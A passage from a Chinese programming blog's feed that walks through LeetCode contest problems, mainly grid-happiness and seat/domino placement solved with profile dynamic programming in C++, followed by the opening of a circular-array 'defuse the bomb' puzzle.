<code>extrovertsCount</code>个外向的人。</p><p>请你决定网格中应当居住多少人，并为每个人分配一个网格单元。 注意，不必 让所有人都生活在网格中。</p><p>每个人的 幸福感 计算如下：</p><ul><li>内向的人 开始 时有 <code>120</code> 个幸福感，但每存在一个邻居（内向的或外向的）他都会 失去  <code>30</code> 个幸福感。</li><li>外向的人 开始 时有<code>40</code>个幸福感，每存在一个邻居（内向的或外向的）他都会 得到  <code>20</code>个幸福感。<br>邻居是指居住在一个人所在单元的上、下、左、右四个直接相邻的单元中的其他人。</li></ul><p>网格幸福感 是每个人幸福感的 总和 。 返回 最大可能的网格幸福感 。</p><p>示例 1：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：m = <span class="number">2</span>, n = <span class="number">3</span>, <span class="built_in">int</span>rovertsCount = <span class="number">1</span>, extrovertsCount = <span class="number">2</span></span><br><span class="line">输出：<span class="number">240</span></span><br><span class="line">解释：假设网格坐标 (row, column) 从 <span class="number">1</span> 开始编号。</span><br><span class="line">将内向的人放置在单元 (<span class="number">1</span>,<span class="number">1</span>) ，将外向的人放置在单元 (<span class="number">1</span>,<span class="number">3</span>) 和 (<span class="number">2</span>,<span class="number">3</span>) 。</span><br><span class="line">- 位于 (<span class="number">1</span>,<span class="number">1</span>) 的内向的人的幸福感：<span class="number">120</span>（初始幸福感）- (<span class="number">0</span> * <span class="number">30</span>)（<span class="number">0</span> 位邻居）= <span class="number">120</span></span><br><span class="line">- 位于 (<span class="number">1</span>,<span class="number">3</span>) 的外向的人的幸福感：<span class="number">40</span>（初始幸福感）+ (<span class="number">1</span> * <span class="number">20</span>)（<span class="number">1</span> 位邻居）= <span class="number">60</span></span><br><span class="line">- 位于 (<span class="number">2</span>,<span class="number">3</span>) 的外向的人的幸福感：<span class="number">40</span>（初始幸福感）+ (<span class="number">1</span> * <span class="number">20</span>)（<span class="number">1</span> 位邻居）= <span class="number">60</span></span><br><span class="line">网格幸福感为：<span class="number">120</span> + <span class="number">60</span> + <span class="number">60</span> = <span class="number">240</span></span><br><span class="line">上图展示该示例对应网格中每个人的幸福感。内向的人在浅绿色单元中，而外向的人在浅紫色单元中。</span><br></pre></td></tr></table></figure><p>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：m = <span class="number">3</span>, n = <span class="number">1</span>, <span class="built_in">int</span>rovertsCount = <span class="number">2</span>, extrovertsCount = <span class="number">1</span></span><br><span class="line">输出：<span class="number">260</span></span><br><span class="line">解释：将内向的人放置在单元 (<span class="number">1</span>,<span class="number">1</span>) 和 (<span class="number">3</span>,<span class="number">1</span>) ，将外向的人放置在单元 (<span class="number">2</span>,<span class="number">1</span>) 。</span><br><span class="line">- 位于 (<span class="number">1</span>,<span class="number">1</span>) 的内向的人的幸福感：<span class="number">120</span>（初始幸福感）- (<span class="number">1</span> * <span class="number">30</span>)（<span class="number">1</span> 位邻居）= <span class="number">90</span></span><br><span class="line">- 位于 (<span class="number">2</span>,<span class="number">1</span>) 的外向的人的幸福感：<span class="number">40</span>（初始幸福感）+ (<span class="number">2</span> * <span class="number">20</span>)（<span class="number">2</span> 位邻居）= <span class="number">80</span></span><br><span class="line">- 位于 (<span class="number">3</span>,<span class="number">1</span>) 的内向的人的幸福感：<span class="number">120</span>（初始幸福感）- (<span class="number">1</span> * <span class="number">30</span>)（<span class="number">1</span> 位邻居）= <span class="number">90</span></span><br><span class="line">网格幸福感为 <span class="number">90</span> + <span class="number">80</span> + <span class="number">90</span> = <span class="number">260</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：m = <span class="number">2</span>, n = <span class="number">2</span>, <span class="built_in">int</span>rovertsCount = <span class="number">4</span>, extrovertsCount = <span class="number">0</span></span><br><span class="line">输出：<span class="number">240</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= m, n &lt;= 5</code></li><li><code>0 &lt;= introvertsCount, extrovertsCount &lt;= min(m * n, 6)</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/maximize-grid-happiness" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximize-grid-happiness</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 动态规划</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>第一次见到这种轮廓的动态规划，题目还是非常有意思，终于看懂了@cuiaoxiang的代码，知道了轮廓<code>dp</code>的大概含义。大致意思，就是以当前坐标<code>(x,y)</code>之前的最后外面的一排形成的轮廓的二维状态码形成的动态规划，第一次见到这种题目。具体可以参考解答：<a href="https://leetcode-cn.com/problems/maximize-grid-happiness/solution/zui-da-hua-wang-ge-xing-fu-gan-by-zerotrac2/672331/" target="_blank" rel="noopener">最大化网格幸福感</a>.</li><li>这个题目跟<a href="https://leetcode-cn.com/problems/maximum-students-taking-exam/" target="_blank" rel="noopener">1349. 参加考试的最大学生数</a>,<a href="https://leetcode-cn.com/problems/broken-board-dominoes/" target="_blank" rel="noopener">LCP 04. 覆盖</a>有的一拼，竟然也可以用轮廓<code>dp</code>做出来，真是牛逼的算法，附件的代码中有用轮廓<code>dp</code>完成的代码。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dp[N * N][<span class="number">243</span>][M][M];</span><br><span class="line"><span class="keyword">int</span> p3[N];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> mask, <span class="keyword">int</span> rem_i, <span class="keyword">int</span> rem_e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pos == n * m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>&amp; ret = dp[pos][mask][rem_i][rem_e];</span><br><span class="line">        <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>) <span class="keyword">return</span> ret;</span><br><span class="line">        ret = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; a(m); <span class="comment">// 1: intro; 2: extro</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, t = mask; i &lt; m; ++i, t /= <span class="number">3</span>) a[i] = t % <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">int</span> x = pos / m, y = pos % m;</span><br><span class="line">        <span class="comment">// put nothing</span></span><br><span class="line">        ret = max(ret, solve(pos + <span class="number">1</span>, mask - p3[y] * a[y], rem_i, rem_e));</span><br><span class="line">        <span class="comment">// put intro</span></span><br><span class="line">        <span class="keyword">if</span> (rem_i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> score = <span class="number">120</span>;</span><br><span class="line">            <span class="keyword">if</span> (y - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y - <span class="number">1</span>] == <span class="number">1</span>) score -= <span class="number">60</span>;</span><br><span class="line">            <span class="keyword">if</span> (y - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y - <span class="number">1</span>] == <span class="number">2</span>) score -= <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y] == <span class="number">1</span>) score -= <span class="number">60</span>;</span><br><span class="line">            <span class="keyword">if</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y] == <span class="number">2</span>) score -= <span class="number">10</span>;</span><br><span class="line">            ret = max(ret, score + solve(pos + <span class="number">1</span>, mask - p3[y] * a[y] + p3[y], rem_i - <span class="number">1</span>, rem_e));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// put extro</span></span><br><span class="line">        <span class="keyword">if</span> (rem_e &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> score = <span class="number">40</span>;</span><br><span class="line">            <span class="keyword">if</span> (y - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y - <span class="number">1</span>] == <span class="number">1</span>) score -= <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (y - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y - <span class="number">1</span>] == <span class="number">2</span>) score += <span class="number">40</span>;</span><br><span class="line">            <span class="keyword">if</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y] == <span class="number">1</span>) score -= <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y] == <span class="number">2</span>) score += <span class="number">40</span>;</span><br><span class="line">            ret = max(ret, score + solve(pos + <span class="number">1</span>, mask - p3[y] * a[y] + p3[y] * <span class="number">2</span>, rem_i, rem_e - <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMaxGridHappiness</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">      <span class="keyword">this</span>-&gt;m = m;</span><br><span class="line"></span><br><span class="line">        p3[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; N; ++i) p3[i] = p3[i - <span class="number">1</span>] * <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">memset</span>(dp, <span class="number">255</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="keyword">int</span> ret = solve(<span class="number">0</span>, <span class="number">0</span>, x, y);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><ul><li><ol><li>参加考试的最大学生数<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> dp[<span class="number">64</span>][<span class="number">256</span>][<span class="number">2</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">bitTst</span><span class="params">(<span class="keyword">int</span> mask,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((mask&amp;(<span class="number">1</span>&lt;&lt;n))&gt;&gt;n) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">bitClr</span><span class="params">(<span class="keyword">int</span> mask,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mask&amp;(~(<span class="number">1</span>&lt;&lt;n));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">bitSet</span><span class="params">(<span class="keyword">int</span> mask,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mask|(<span class="number">1</span>&lt;&lt;n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos,<span class="keyword">int</span> left,<span class="keyword">int</span> mask,<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; seats)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> row = seats.size();</span><br><span class="line">        <span class="keyword">int</span> col = seats[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(pos == row*col) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(dp[pos][mask][left] != INF) <span class="keyword">return</span> dp[pos][mask][left];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> x = pos/col;</span><br><span class="line">        <span class="keyword">int</span> y = pos%col;</span><br><span class="line">        <span class="keyword">int</span> curr = bitTst(mask,y);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*empty*/</span></span><br><span class="line">        ret = max(ret,dfs(pos+<span class="number">1</span>,curr,bitClr(mask,y),seats));</span><br><span class="line">        <span class="keyword">if</span>(seats[x][y] == <span class="string">'.'</span>)&#123;</span><br><span class="line">            <span class="comment">/*sit down*/</span></span><br><span class="line">            <span class="keyword">bool</span> valid_left = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">bool</span> valid_left_top = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">bool</span> valid_right_top = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(y<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; left) valid_left_top = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(y<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; bitTst(mask,y<span class="number">-1</span>)) valid_left = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(y+<span class="number">1</span> &lt; col &amp;&amp; bitTst(mask,y+<span class="number">1</span>)) valid_right_top = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(valid_left&amp;&amp;valid_left_top&amp;&amp;valid_right_top)&#123;</span><br><span class="line">                ret = max(ret,<span class="number">1</span> + dfs(pos+<span class="number">1</span>,curr,bitSet(mask,y),seats));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        dp[pos][mask][left] = ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxStudents</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; seats)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> row = seats.size();</span><br><span class="line">        <span class="keyword">int</span> col = seats[<span class="number">0</span>].size();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(dp,INF,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="keyword">int</span> ret = dfs(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,seats);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></li><li>LCP 04. 覆盖<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">64</span>][<span class="number">256</span>];</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> row,col;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">bitTst</span><span class="params">(<span class="keyword">int</span> mask,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((mask&amp;(<span class="number">1</span>&lt;&lt;n))&gt;&gt;n) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">bitClr</span><span class="params">(<span class="keyword">int</span> mask,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mask&amp;(~(<span class="number">1</span>&lt;&lt;n));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">bitSet</span><span class="params">(<span class="keyword">int</span> mask,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mask|(<span class="number">1</span>&lt;&lt;n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos,<span class="keyword">int</span> mask,<span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; &amp; broken)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(pos == row*col) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(dp[pos][mask] != INF) <span class="keyword">return</span> dp[pos][mask];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> x = pos/col;</span><br><span class="line">        <span class="keyword">int</span> y = pos%col;</span><br><span class="line">        <span class="comment">/*empty*/</span></span><br><span class="line">        ret = max(ret,dfs(pos+<span class="number">1</span>,bitClr(mask,y),broken));</span><br><span class="line">        <span class="comment">/*fill one*/</span></span><br><span class="line">        <span class="keyword">if</span>(!broken.count(pos))&#123;</span><br><span class="line">            <span class="comment">/*check left*/</span></span><br><span class="line">            <span class="keyword">if</span>(y<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; !broken.count(pos<span class="number">-1</span>) &amp;&amp; !bitTst(mask,y<span class="number">-1</span>))&#123;</span><br><span class="line">                ret = max(ret,<span class="number">1</span> + dfs(pos+<span class="number">1</span>,mask|(<span class="number">1</span>&lt;&lt;(y<span class="number">-1</span>))|(<span class="number">1</span>&lt;&lt;y),broken));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*check top*/</span></span><br><span class="line">            <span class="keyword">if</span>(x<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; !broken.count((x<span class="number">-1</span>)*col+y) &amp;&amp; !bitTst(mask,y))&#123;</span><br><span class="line">                ret = max(ret,<span class="number">1</span> + dfs(pos+<span class="number">1</span>,mask|(<span class="number">1</span>&lt;&lt;y),broken));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[pos][mask] = ret;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">domino</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; broken)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;row = n;</span><br><span class="line">        <span class="keyword">this</span>-&gt;col = m;</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; b;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : broken) b.insert(v[<span class="number">0</span>]*col + v[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">memset</span>(dp,INF,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="keyword">return</span> dfs(<span class="number">0</span>,<span class="number">0</span>,b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title="#"></a>#</h2>欢迎关注和打赏，感谢支持！</li><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-215&quot;&gt;&lt;a href=&quot;#leetcode-contest-215&quot; class=&quot;headerlink&quot; title=&quot;leetcode  contest 215&quot;&gt;&lt;/a&gt;leetcode  contest 215&lt;/h1&gt;&lt;p&gt;周赛的题目，前三题比较容易，前三题基本上送分的题目，大概差不多也就40分钟搞定前三题，目测大概也就200名左右，最后一题确实不知道怎么做，直接放弃算了。&lt;/p&gt;&lt;h2 id=&quot;5601-设计有序流&quot;&gt;&lt;a href=&quot;#5601-设计有序流&quot; class=&quot;headerlink&quot; title=&quot;5601. 设计有序流&quot;&gt;&lt;/a&gt;5601. 设计有序流&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;有 n 个 (id, value) 对，其中 id 是 1 到 n 之间的一个整数，value 是一个字符串。不存在 id 相同的两个 (id, value) 对。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  双周赛39场</title>
    <link href="http://yoursite.com/2020/11/15/225/"/>
    <id>http://yoursite.com/2020/11/15/225/</id>
    <published>2020-11-14T16:26:13.346Z</published>
    <updated>2020-11-18T15:45:59.236Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-biweekly-contest-39"><a href="#leetcode-biweekly-contest-39" class="headerlink" title="leetcode biweekly contest 39"></a>leetcode biweekly contest 39</h1><p>双周赛的题目，前三题比较容易，第四题是经典的状态压缩空间，竟然没有做出来，还是对算法的数量度掌握不够，对于状态子空间里的遍历还是没有掌握住.最终排名如下：<br><img src="https://i.loli.net/2020/11/15/EV9JLbdmjH74iIY.png" alt="1"></p><h2 id="5550-拆炸弹"><a href="#5550-拆炸弹" class="headerlink" title="5550. 拆炸弹"></a>5550. 拆炸弹</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>你有一个炸弹需要拆除，时间紧迫！你的情报员会给你一个长度为 n 的 循环 数组 code 以及一个密钥 k 。</p><a id="more"></a><p>为了获得正确的密码，你需要替换掉每一个数字。所有数字会 同时 被替换。</p><ul><li>如果 k &gt; 0 ，将第 i 个数字用 接下来 k 个数字之和替换。</li><li>如果 k &lt; 0 ，将第 i 个数字用 之前 k 个数字之和替换。</li><li>如果 k == 0 ，将第 i 个数字用 0 替换。<br>由于 <code>code</code> 是循环的， <code>code[n-1]</code> 下一个元素是 <code>code[0]</code> ，且 <code>code[0]</code> 前一个元素是 <code>code[n-1]</code>。</li></ul><p>给你 循环 数组 <code>code</code> 和整数密钥 <code>k</code> ，请你返回解密后的结果来拆除炸弹！</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：code = [<span class="number">5</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">4</span>], k = <span class="number">3</span></span><br><span class="line">输出：[<span class="number">12</span>,<span class="number">10</span>,<span class="number">16</span>,<span class="number">13</span>]</span><br><span class="line">解释：每个数字都被接下来 <span class="number">3</span> 个数字之和替换。解密后的密码为 [<span class="number">7</span>+<span class="number">1</span>+<span class="number">4</span>, <span class="number">1</span>+<span class="number">4</span>+<span class="number">5</span>, <span class="number">4</span>+<span class="number">5</span>+<span class="number">7</span>, <span class="number">5</span>+<span class="number">7</span>+<span class="number">1</span>]。注意到数组是循环连接的。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：code = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], k = <span class="number">0</span></span><br><span class="line">输出：[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">解释：当 k 为 <span class="number">0</span> 时，所有数字都被 <span class="number">0</span> 替换。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：code = [<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">3</span>], k = <span class="number">-2</span></span><br><span class="line">输出：[<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">13</span>]</span><br><span class="line">解释：解密后的密码为 [<span class="number">3</span>+<span class="number">9</span>, <span class="number">2</span>+<span class="number">3</span>, <span class="number">4</span>+<span class="number">2</span>, <span class="number">9</span>+<span class="number">4</span>] 。注意到数组是循环连接的。如果 k 